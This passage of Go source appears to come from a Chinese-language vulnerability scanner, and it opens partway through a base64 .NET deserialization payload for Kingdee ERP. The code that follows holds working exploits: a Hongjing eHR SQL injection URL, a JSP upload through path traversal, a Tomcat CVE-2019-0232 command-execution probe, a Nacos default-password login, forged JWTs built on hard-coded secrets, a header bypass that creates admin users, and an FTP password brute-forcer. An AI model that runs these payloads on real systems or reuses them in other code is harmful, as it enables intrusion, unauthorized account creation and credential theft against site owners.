bj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABnIAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQZzAAAAC2dldF9DdXJyZW50CgFLAAAAQwAAAAlzAAAACT4AAAAJcgAAAAZ2AAAAGVN5c3RlbS5UeXBlIGdldF9DdXJyZW50KCkGdwAAABlTeXN0ZW0uVHlwZSBnZXRfQ3VycmVudCgpCAAAAAoBTAAAAEIAAAAGeAAAAMYBU3lzdGVtLkZ1bmNgMltbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCT4AAAAKCT4AAAAGegAAABBTeXN0ZW0uQWN0aXZhdG9yBnsAAAAOQ3JlYXRlSW5zdGFuY2UKAU0AAABDAAAACXsAAAAJPgAAAAl6AAAABn4AAAApU3lzdGVtLk9iamVjdCBDcmVhdGVJbnN0YW5jZShTeXN0ZW0uVHlwZSkGfwAAAClTeXN0ZW0uT2JqZWN0IENyZWF0ZUluc3RhbmNlKFN5c3RlbS5UeXBlKQgAAAAKAU4AAAAPAAAABoAAAAAmU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5Db21tYW5kSUQEAAAACToAAAAQTwAAAAIAAAAJggAAAAgIACAAAASCAAAAC1N5c3RlbS5HdWlkCwAAAAJfYQJfYgJfYwJfZAJfZQJfZgJfZwJfaAJfaQJfagJfawAAAAAAAAAAAAAACAcHAgICAgICAgITE9J07irREYv7AKDJDyb3Cws=", "format": "3"}`

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Dial: (&net.Dialer{
				Timeout: 5 * time.Second, // 设置连接超时时间
			}).Dial,
		},
	}
	req, err := http.NewRequest("POST", vurl, bytes.NewBuffer([]byte(data)))
	if err != nil {
		return ""
	}

	req.Header.Set("Content-Type", "text/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
	req.Header.Set("cmd", "whoami")
	maxRetries := 3
	retryCount := 0

	for retryCount < maxRetries {
		resp, err := client.Do(req)
		if err != nil {
			retryCount++
			continue
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return ""
		}

		bodys = string(body)
		if strings.Contains(bodys, "response_error") {
			return "[+] 存在金蝶云星空erp反序列化漏洞,漏洞URL：" + vurl
		} else {
			bodys = ""
		}
		break
	}

	if retryCount == maxRetries {
		bodys = ""
	}
	return bodys
}

// 宏景eHR
func hj_eHR(url string) string {
	vurl := url + "/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjingHcmwoshiniye~27~2cdb~5fname~28~29~2d~2d&codesetid=1&flag=c&parentid=-1&status=1"
	// 创建一个自定义的 http.Transport，并禁用证书验证
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	// 创建具有超时设置的HTTP客户端
	client := &http.Client{
		Timeout:   time.Second * 10, // 设置超时时间为10秒
		Transport: transport,
	}
	headers := http.Header{}
	headers.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
	bodys := ""
	resp, err := client.Get(vurl)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	bodys = string(body)
	if strings.Contains(bodys, "hongjingHcmwoshiniye") {
		return "[+] 存在宏景eHR SQL注入,漏洞URL：" + url + "/servlet/codesettree?categories=1&codesetid=1&flag=c&parentid=-1&status=1"
	} else {
		bodys = ""
	}
	return bodys
}

// 宏景eHR文件上传
func hj_eHR_rce(url string) string {
	bodys := ""

	// 创建一个自定义的 http.Transport，并禁用证书验证
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	// 创建具有超时设置的HTTP客户端
	client := &http.Client{
		Timeout:   time.Second * 50, // 设置超时时间为10秒
		Transport: transport,
	}
	payload := `DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
FILETYPE=Li5cNDAzLmpzcA==
RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66

<%out.println("hello1");%>`

	vurl := url + "/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp"
	req, err := http.NewRequest("POST", vurl, strings.NewReader(payload))
	if err != nil {
		return ""
	}
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}

	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)

	//fmt.Println(string(body))

	bodys = string(body)
	if resp.StatusCode == http.StatusOK {
		return "[+] 存在宏景eHR文件上传漏洞,漏洞URL：" + url + "/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp"
	} else {
		bodys = ""
	}
	return bodys
}

// Apache Tomcat
func tomcat_rce(url string) string {
	vurl := url + "/cgi-bin/hello.bat?dir"
	// 创建一个自定义的 http.Transport，并禁用证书验证
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	// 创建具有超时设置的HTTP客户端
	client := &http.Client{
		Timeout:   time.Second * 10, // 设置超时时间为10秒
		Transport: transport,
	}
	bodys := ""
	resp, err := client.Get(vurl)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	bodys = string(body)
	if strings.Contains(bodys, "WEB-INF") {
		return "[+] 存在Apache Tomcat远程代码执行漏洞(CVE-2019-0232),漏洞URL：" + vurl
	} else {
		bodys = ""
	}
	return bodys

}

// shiro
func containsRememberMeDeleteMe(cookies string) bool {
	return strings.Contains(cookies, "rememberMe=deleteMe")
}

// Nacos 弱密码
func Nacos_password(url string) string {
	// 创建一个自定义的 http.Transport，并禁用证书验证
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	// 创建具有超时设置的HTTP客户端
	client := &http.Client{
		Timeout:   time.Second * 10, // 设置超时时间为10秒
		Transport: transport,
	}
	bodys := ""
	headers := http.Header{}
	headers.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
	headers.Set("Content-Type", "application/x-www-form-urlencoded")
	//vurl:=url+"/v1/auth/login"
	payloads := []string{
		"/v1/auth/login",
		"/nacos/v1/auth/login",
		"/v1/auth/users/login",
		"/nacos/v1/auth/users/login",
	}
	for _, payload := range payloads {
		vurl := url + payload
		//fmt.Println(vurl)
		resp, err := client.Get(vurl)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusNotFound {
			data := "username=nacos&password=nacos"
			req, err := http.NewRequest("POST", vurl, strings.NewReader(data))
			if err != nil {
				continue
			}
			req.Header = headers
			post_resp, err := client.Do(req)
			if err != nil {
				continue
			}
			defer post_resp.Body.Close()

			body, err := ioutil.ReadAll(post_resp.Body)
			if err != nil {
				continue
			}
			bodys = string(body)
			if strings.Contains(bodys, "Bearer") || strings.Contains(bodys, "accessToken") {
				return "[+] 存在弱口令漏洞nacos/nacos"
			} else {
				bodys = ""
			}
		}
	}
	return bodys

}

// Nacos 未授权访问
func Nacos_unauthorized(url string) string {
	bodyStr := ""
	// 创建一个自定义的 http.Transport，并禁用证书验证
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	// 创建具有超时设置的HTTP客户端
	client := &http.Client{
		Timeout:   time.Second * 10, // 设置超时时间为10秒
		Transport: transport,
	}
	payloads := []string{
		"/v1/auth/users?pageNo=1&pageSize=9",
		"/nacos/v1/auth/users?pageNo=1&pageSize=9",
	}
	for _, payload := range payloads {
		vurl := url + payload
		resp, err := client.Get(vurl)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			continue
		}
		bodyStr = string(bodyBytes)
		//return bodyStr
		if strings.Contains(bodyStr, "password") {
			//fmt.Println(bodys)
			return "[+] 存在Nacos未授权访问漏洞 漏洞url：" + vurl
		} else {
			bodyStr = ""
		}
	}
	return bodyStr

}

// jwt secret key 硬编码绕过
func Nacos_jwt(url string) string {
	bodys := ""
	// 创建一个自定义的 http.Transport，并禁用证书验证
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	// 创建具有超时设置的HTTP客户端
	client := &http.Client{
		Timeout:   time.Second * 10, // 设置超时时间为10秒
		Transport: transport,
	}
	payloads := []string{
		"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY4OTk0MzI0M30.FJO0X3hqoR6E2kmTtzU3FGF2gwuqDo5TTcYEMmYKFVk",
		"eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0._GhyhPBLXfGVgWIAGnNT7z9mPL6-SPDAKorJ8eA1E3ZjnCPVkJYHq7OWGCm9knnDloJ7_mKDmSlHtUgNXKkkKw",
		"eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImlhdCI6MjYxNjIzOTAyMn0.uSFCyir6S9MzNTOYLwfWIm1eQo6eO3tWskYA6fgQu55GQdrFO-4IvP6oBEGblAbYotMA6ZaS9l0ySsW_2toFPQ",
		"eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImlhdCI6MjYxNjIzOTAyMn0.jHIPHGlyaC7qKAGj0G6Kgb1WmrIpHosCnP8cHC24zceHpbyD7cmYuLc9r1oj3J6oFGr3KMnuKJlvTy8dopwNvw",
		"eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Im5hY29zIiwiaWF0IjoyNjE2MjM5MDIyfQ.BEtiFKLAleuBCeakAoC6na-Lr8mfOUYUUm3nxaM0v3L5NeLk7UGZTDXCJQRguQDgU2HYE1VK9ETDIB-qjgqVnw",
	}
	paths := []string{
		"/v1/user/login",
		"/nacos/v1/user/login",
		"/v1/auth/login",
		"/nacos/v1/auth/login",
	}
	data := "username=nacos&password=123456"
	for _, payload := range payloads {
		for _, path := range paths {
			headers := http.Header{}
			headers.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
			headers.Set("Content-Type", "application/x-www-form-urlencoded")
			headers.Set("Authorization", "Bearer "+payload)
			vurl := url + path
			//fmt.Println(path+":"+payload)
			req, err := http.NewRequest("POST", vurl, strings.NewReader(data))
			if err != nil {
				continue
			}
			req.Header = headers
			post_resp, err := client.Do(req)
			if err != nil {
				continue
			}
			defer post_resp.Body.Close()

			body, err := ioutil.ReadAll(post_resp.Body)
			if err != nil {
				continue
			}
			bodys = string(body)
			if strings.Contains(bodys, "Bearer") || strings.Contains(bodys, "accessToken") {
				//fmt.Println(bodys)
				return "[+] 存在Nacos jwt secret key 硬编码绕过 漏洞url：" + vurl + "\n[+] data:" + payload
			} else {
				bodys = ""
			}

		}

	}
	return bodys

}

// 开启授权后identity硬编码绕过
func Nacos_identity(url string) string {
	bodys := ""
	// 创建一个自定义的 http.Transport，并禁用证书验证
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	// 创建具有超时设置的HTTP客户端
	client := &http.Client{
		Timeout:   time.Second * 10, // 设置超时时间为10秒
		Transport: transport,
	}
	paths := []string{
		"/v1/auth/users",
		"/nacos/v1/auth/users",
		"/v1/users",
		"/nacos/v1/users",
	}
	// 创建一个空的字典
	person := map[string]string{
		"serverIdentity": "security",
		"authKey":        "nacosSecurty",
		"example":        "example",
		"test":           "test",
	}
	for _, path := range paths {
		for key, value := range person {
			// // 生成一个随机字母
			randomLetter := byte(rand.Intn(26) + 'a')
			// fmt.Printf("%c\n", randomLetter)
			// // 生成一个随机数字
			randomNumber := byte(rand.Intn(10) + '0')
			// fmt.Printf("%c\n", randomNumber)
			// // 生成一个随机符号
			symbols := []byte("!@#$%^&*()")
			randomSymbol := symbols[rand.Intn(len(symbols))]
			nacos := fmt.Sprintf("nacos%c%c%c%c", randomLetter, randomNumber, randomSymbol, randomLetter)
			passds := "nacos@2023"

			data := fmt.Sprintf("username=%s&password=%s", nacos, passds)
			fmt.Println(data)

			headers := http.Header{}
			headers.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
			headers.Set("Content-Type", "application/x-www-form-urlencoded")
			headers.Set(key, value)
			vurl := url + path
			req, err := http.NewRequest("POST", vurl, strings.NewReader(data))
			if err != nil {
				continue
			}
			req.Header = headers
			post_resp, err := client.Do(req)
			if err != nil {
				continue
			}
			defer post_resp.Body.Close()

			body, err := ioutil.ReadAll(post_resp.Body)
			if err != nil {
				continue
			}
			bodys := string(body)
			if strings.Contains(bodys, "create user ok") {
				//fmt.Println("[+] 存在Nacos开启授权后identity硬编码绕过漏洞 账号密码：" + nacos+":"+passds)
				return "[+] 存在Nacos开启授权后identity硬编码绕过漏洞 账号密码：" + nacos + ":" + passds + ":" + key + value
			}

		}
	}
	return bodys

}

func MapToJson(param map[string][]string) string {
	dataType, _ := json.Marshal(param)
	dataString := string(dataType)
	return dataString
}

func RemoveDuplicatesAndEmpty(a []string) (ret []string) {
	a_len := len(a)
	for i := 0; i < a_len; i++ {
		if (i > 0 && a[i-1] == a[i]) || len(a[i]) == 0 {
			continue
		}
		ret = append(ret, a[i])
	}
	return
}

func (s *FinScan) fingerScan() {
	for s.UrlQueue.Len() != 0 {
		dataface := s.UrlQueue.Pop()
		switch dataface.(type) {
		case []string:
			url := dataface.([]string)
			host := getHostFromURL(url[0])
			che_ftp := checkFTPPort(host)
			if che_ftp {
				out := Outrestul{host, "FTP", "", 0, 0, ""}
				s.FocusResult = append(s.FocusResult, out)
			}

			var data *resps
			data, err := httprequest(url, s.Proxy)

			if err != nil {
				url[0] = strings.ReplaceAll(url[0], "https://", "http://")
				data, err = httprequest(url, s.Proxy)

				if err != nil {
					continue
				}
			}

			for _, jurl := range data.jsurl {

				if jurl != "" {
					s.UrlQueue.Push([]string{jurl, "1"})
				}
			}

			if data.statuscode == 404 && strings.Contains(url[0], "8848") {
				urlWithNacos := url[0] + "/nacos"
				fmt.Println(urlWithNacos)

				data, err = httprequest([]string{urlWithNacos, "1"}, s.Proxy)
				if err != nil {
					continue
				}
			}
			cfg, err := ini.Load("poc.ini")
			if err != nil {
				fmt.Println("无法加载配置文件:", err)
				//return
			}
			route := cfg.Section("").Key("route").String()
			url_paths := []string{
				"",
			}
			if route == "yes" {
				filePath := "./dict/path.txt"

				// 打开文件
				file, err := os.Open(filePath)
				if err != nil {
					fmt.Println("打开文件时出错:", err)
					return
				}
				defer file.Close()

				scanner := bufio.NewScanner(file)
				for scanner.Scan() {
					line := scanner.Text()
					url_paths = append(url_paths, line)
				}
				if err := scanner.Err(); err != nil {
					fmt.Println("读取文件时出错:", err)
					return
				}

			}
			slice := []string{}
			for _, url_path := range url_paths {
				urlWithroute := url[0] + url_path
				data, err = httprequest([]string{urlWithroute, "1"}, s.Proxy)
				if err != nil {
					continue
				}

				for _, jurl := range data.jsurl {

					if jurl != "" {
						s.UrlQueue.Push([]string{jurl, "1"})
					}
				}
				headers := MapToJson(data.header)
				var cms []string
				for _, finp := range s.Finpx.Fingerprint {
					if finp.Location == "body" {
						if finp.Method == "keyword" {
							if iskeyword(data.body, finp.Keyword) {
								cms = append(cms, finp.Cms)
							}
						}

						if finp.Method == "faviconhash" {
							if data.favhash == finp.Keyword[0] {
								cms = append(cms, finp.Cms)
							}
						}
						if finp.Method == "regular" {
							if isregular(data.body, finp.Keyword) {
								cms = append(cms, finp.Cms)
							}
						}
					}
					if finp.Location == "header" {
						if finp.Method == "keyword" {
							if iskeyword(headers, finp.Keyword) {
								cms = append(cms, finp.Cms)
							}
						}
						if finp.Method == "regular" {
							if isregular(headers, finp.Keyword) {
								cms = append(cms, finp.Cms)
							}
						}
					}
					if finp.Location == "title" {
						if finp.Method == "keyword" {
							if iskeyword(data.title, finp.Keyword) {
								cms = append(cms, finp.Cms)
							}
						}
						if finp.Method == "regular" {
							if isregular(data.title, finp.Keyword) {
								cms = append(cms, finp.Cms)
							}
						}
					}
				}
				cms = RemoveDuplicatesAndEmpty(cms)
				cmss := strings.Join(cms, ",")
				out := Outrestul{data.url, cmss, data.server, data.statuscode, data.length, data.title}
				s.AllResult = append(s.AllResult, out)
				if len(out.Cms) != 0 {
					outstr := fmt.Sprintf("[ %s | %s | %s | %d | %d | %s ]", out.Url, out.Cms, out.Server, out.Statuscode, out.Length, out.Title)

					hasBanana := false
					for _, element := range slice {
						if element == out.Cms {
							hasBanana = true
							break
						}
					}

					if !hasBanana {
						color.RGBStyleFromString("237,64,35").Println(outstr)
						s.FocusResult = append(s.FocusResult, out)
					}
					slice = append(slice, out.Cms)

				} else {
					outstr := fmt.Sprintf("[ %s | %s | %s | %d | %d | %s ]", out.Url, out.Cms, out.Server, out.Statuscode, out.Length, out.Title)
					fmt.Println(outstr)
				}
			}
			slice = slice[:0]
		default:
			continue
		}
	}
}

// ftp检测
func getHostFromURL(rawURL string) string {
	if !strings.HasPrefix(rawURL, "http://") && !strings.HasPrefix(rawURL, "https://") {
		rawURL = "http://" + rawURL
	}
	parsedURL, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	host := parsedURL.Host
	return host
}

func checkFTPPort(host string) bool {
	conn, err := net.Dial("tcp", host)
	if err != nil {
		return false
	}
	defer conn.Close()

	// 设置超时时间为5秒
	conn.SetDeadline(time.Now().Add(5000 * time.Millisecond))

	fmt.Fprintf(conn, "HEAD / HTTP/1.0\r\n\r\n")

	buffer := make([]byte, 1024)
	_, err = conn.Read(buffer)
	if err != nil {
		netErr, ok := err.(net.Error)
		if ok && netErr.Timeout() {
			return false
		}
		return false
	}

	response := string(buffer)
	if response[:3] == "220" {
		return true
	}

	return false
}

//ftp爆破

func ftp_bp(Hostport string) {
	resultChan := make(chan string)
	stopChan := make(chan struct{})

	var wg sync.WaitGroup

	file, err := os.Open("./dict/user.txt")
	if err != nil {
		fmt.Println("无法打开文件:", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		Username := scanner.Text()
		passFile, err := os.Open("./dict/pass.txt")
		if err != nil {
			fmt.Println("无法打开文件:", err)
			return
		}
		defer passFile.Close()

		passScanner := bufio.NewScanner(passFile)
		for passScanner.Scan() {
			select {
			case <-stopChan:
				return
			default:
				Password := passScanner.Text()

				wg.Add(1)

				go func(username, password string) {
					defer wg.Done()

					conn, err := ftp.DialTimeout(Hostport, time.Second*30)
					if err != nil {
						return
					}
					defer conn.Quit()

					err = conn.Login(username, password)
					if err == nil {
						result := fmt.Sprintf("[+] Found FTP:%s username:%s password:%s", Hostport, username, password)
						resultChan <- result
						select {
						case stopChan <- struct{}{}:
						default:
						}
						return
					}

				}(Username, Password)
			}
		}

		if err := passScanner.Err(); err != nil {
			fmt.Println("读取文件时发生错误:", err)
		}
	}

	go func() {
		wg.Wait()
		close(resultChan)
	}()

	for result := range resultChan {
		fmt.Println(result)
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("读取文件时发生错误:", err)
	}
}
